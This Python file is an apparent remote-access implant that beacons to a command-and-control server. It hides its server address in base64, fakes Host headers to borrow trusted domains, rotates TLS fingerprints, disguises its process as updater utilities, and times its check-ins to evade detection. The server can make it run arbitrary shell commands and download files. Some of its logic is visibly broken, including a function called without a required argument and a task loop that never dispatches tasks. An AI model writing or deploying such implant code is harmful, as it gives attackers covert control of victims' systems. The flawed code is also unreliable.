#!/usr/bin/env python3
"""Agent beacon — periodic check-in with the C2 server."""

import sys
import time
import uuid
import random
import json
import subprocess
import base64
from datetime import datetime

try:
    from shared.protocol import encrypt_data, decrypt_data
except ImportError:
    print("[!] Cannot find shared/protocol - C2 will not work")
    sys.exit(1)


# ── Configuration (obfuscated — decoded at runtime) ────────────────
_OBF_SERVER_URL = b"eHR0cDovL1lPVVIuU0VSVkVSLklQOjUwMDA="
_OBF_BEACON_EP  = b"YXBpL3N0YXR1cw=="
_OBF_UPLOAD_EP  = b"YXBpL3VwbG9hZA=="

SERVER_URL       = ""
BEACON_ENDPOINT  = ""
RESULT_ENDPOINT  = ""


def _init_config():
    """Decode base64 config strings at runtime."""
    global SERVER_URL, BEACON_ENDPOINT, RESULT_ENDPOINT
    SERVER_URL      = base64.b64decode(_OBF_SERVER_URL).decode()
    BEACON_ENDPOINT = base64.b64decode(_OBF_BEACON_EP).decode().lstrip("/")
    RESULT_ENDPOINT = base64.b64decode(_OBF_UPLOAD_EP).decode().lstrip("/")


def _build_url(endpoint: str) -> str:
    """Build a full C2 URL, stripping/adding slashes as needed."""
    return f"{SERVER_URL.rstrip('/')}/{endpoint.lstrip('/')}"


# ── Agent identity (generated per run) ────────────────────────────
_AGENT_ID      = uuid.uuid4()
_MASQUERADE_NAMES = [
    "python_updater.exe",
    "chrome_update_helper",
    "office_sync_service",
    "adobe_updater",
    "sys_monitor",
    "net_daemon",
]

# TLS fingerprint rotation list (randomized per request)
_TLS_CLIENTS = [
    "chrome_112", "firefox_108", "safari_16_0",
    "chrome_110", "edge_111",
]

# Domain fronting — randomized Host headers to look legitimate
_FAKE_HOSTS = [
    "cdn.discordapp.com",
    "s3.amazonaws.com",
    "cloudfront.net",
    "firebase.googleapis.com",
    "slack.com",
    "fonts.googleapis.com",
]

# Beacon timing globals (overridable via task)
SLEEP_MIN = 30
SLEEP_MAX = 120


# ── HTTP helpers ─────────────────────────────────────────────────

def _json_post(session, url: str, data: dict):
    """Send encrypted JSON POST with a randomized Host header."""
    session.headers["Host"] = random.choice(_FAKE_HOSTS)
    try:
        payload = encrypt_data(json.dumps(data))
        resp = session.post(url, json={"data": payload}, timeout=15)
        if resp.status_code == 200:
            return resp.json()
    except Exception as exc:
        print(f"[!] POST error: {exc}")
    return None


# ── Beacon loop ───────────────────────────────────────────────────

def _beacon():
    """Core beacon loop: encrypt ID → POST → decrypt response."""
    encrypted = make_beacon(BEACON_ENDPOINT)
    if encrypted is None:
        return

    try:
        decrypted = decrypt_data(encrypted.get("payload", ""))
        parsed    = json.loads(decrypted)
    except Exception as exc:
        print(f"[!] Decryption error: {exc}")
        return

    task = parsed.get("task")
    if task is not None:
        _dispatch_task(task)


def make_beacon(endpoint: str):
    """Encrypt beacon payload and POST to the given endpoint."""
    try:
        import tls_client
    except ImportError:
        print("[!] tls_client not available — falling back")
        return None

    client_id = random.choice(_TLS_CLIENTS)
    session   = tls_client.Session(client_identifier=client_id)
    url       = _build_url(endpoint)
    return _json_post(session, url, {"id": str(_AGENT_ID)})


# ── Download (domain-fronted + fake-host TLS) ─────────────────────

def download_file(url: str, save_as: str) -> bool:
    """Fetch a remote file via tls_client with a randomized Host."""
    try:
        import tls_client
    except ImportError:
        print("[!] tls_client not available")
        return False

    client_id = random.choice(_TLS_CLIENTS)
    session   = tls_client.Session(client_identifier=client_id)
    resp      = session.get(url, stream=True, timeout=120)

    try:
        with open(save_as, "wb") as fh:
            for chunk in resp.iter_content(chunk_size=8192):
                if chunk:
                    fh.write(chunk)
        print(f"[+] Downloaded {url} -> {save_as}")
        return True
    except Exception as exc:
        print(f"[!] Download error: {exc}")
        return False


# ── Result submission ───────────────────────────────────────────

def _post_result(result: str):
    """Encrypt the result and POST it back to the server."""
    try:
        import tls_client
    except ImportError:
        print("[!] Cannot post — no tls_client")
        return

    session = tls_client.Session(client_identifier=random.choice(_TLS_CLIENTS))
    data    = {"id": str(_AGENT_ID), "output": result}
    _json_post(session, _build_url(RESULT_ENDPOINT), data)


# ── Task execution ──────────────────────────────────────────────

def _execute_shell(command: str):
    """Run a shell command and post the output back."""
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, timeout=60
        )
        _post_result(result.decode().strip())
    except subprocess.TimeoutExpired:
        _post_result("[!] Command timed out")
    except subprocess.CalledProcessError as exc:
        _post_result(exc.output.decode().strip())
    except Exception as exc:
        _post_result(f"[!] Shell error: {exc}")


# ── Beacon delay (layered timing evasion) ─────

def _compute_beacon_delay() -> int:
    """Compute the next beacon delay with layered timing evasion.

    Returns a value clamped to 5 s – 7200 s.
    """
    hour = datetime.now().hour

    # Time-of-day baseline
    if hour in (1, 2, 3, 4, 5, 6):        # Dead hours → large delay range
        base_low, base_high = 180, 480
    elif hour in (0, 23):                 # Night mode – moderate
        base_low, base_high = 90, 360
    else:                                  # Daytime (7–22) → tight burst
        base_low, base_high = 30, 120

    # Layer 1: uniform jitter within range
    delay_range = base_high - base_low
    delay = base_low + random.randint(0, int(delay_range * 0.5))

    # Layer 2: Pareto spike (~15% chance)
    if random.random() < 0.15:
        spike = pareto_draw(scale=base_high * 2)
        delay = max(delay, int(spike))

    # Layer 3: long sleep (~3% chance)
    if random.random() < 0.03:
        silence = random.randint(base_high * 2, base_high * 8)
        delay   = max(delay, silence)

    return max(5, min(delay, 7200))


def pareto_draw(alpha: float, scale: float) -> float:
    """Draw from a Pareto distribution (power-law heavy tail)."""
    u = random.random()
    u   = max(u, 1e-10)
    return scale * (u ** (-1.0 / alpha))


# ── Task dispatcher ───────────────────────────────────────────────

_TASK_HANDLERS = {
    "shell" : lambda d: _execute_shell(d.get("command", "")),
    "download": lambda d: download_file(
        d.get("url", ""), d.get("save_as", "downloaded.tmp")),
}


def _dispatch_task(task_data: dict):
    """Parse the task type and dispatch to the handler."""
    task_type = task_data.get("type")

    if (handler := _TASK_HANDLERS.get(task_type)):
        handler(task_data)
    else:
        print(f"[?] Unknown task type: {task_type}")


# ── Public API ─────────────────────────────────────────────────────

def run_shell(command: str):
    """Execute a shell command and report back."""
    _execute_shell(command)


def run_download(url: str, save_as: str = "downloaded.tmp"):
    """Fetch a remote file and report result."""
    download_file(url, save_as)
    _post_result(f"[+] Downloaded {url} -> {save_as}")


def run_sleep(min_val=None, max_val=None):
    """Update the agent's beacon sleep interval (task-driven)."""
    global SLEEP_MIN, SLEEP_MAX
    new_min = min_val if isinstance(min_val, int) else 30
    new_max = max_val if isinstance(max_val, int) else 120
    SLEEP_MIN = max(1, new_min)
    SLEEP_MAX = max(SLEEP_MIN + 1, new_max)


# ── Masquerade (rename process to blend in) ───────────────────────

def _masquerade():
    """Rename the running process to look like a boring system utility."""
    name   = random.choice(_MASQUERADE_NAMES)

    if sys.platform == "linux":
        import ctypes
        try:
            libc = ctypes.CDLL("libc.so.6")
            libc.prctl(15, ctypes.cast((name + "\x00").encode(),
                            ctypes.c_char_p), 0, 0, 0)
        except Exception:
            pass

    if sys.platform == "win32":
        import ctypes
        try:
            ctypes.windll.SetConsoleTitleW(name + "\x00")
        except Exception:
            pass

    if sys.argv and len(sys.argv) > 0:
        sys.argv[0] = name


# ── Main loop ────────────────────────────────────────────────────

if __name__ == "__main__":
    _init_config()
    _masquerade()

    print(f"[*] Agent started (ID: {_AGENT_ID[:8]}...)")
    print(f"[*] Connects to: {BEACON_ENDPOINT}")

    time.sleep(random.uniform(1, 5))

    while True:
        try:
            make_beacon(BEACON_ENDPOINT)
        except Exception as exc:
            print(f"[!] Beacon error: {exc}")

        delay = _compute_beacon_delay()
        time.sleep(delay)
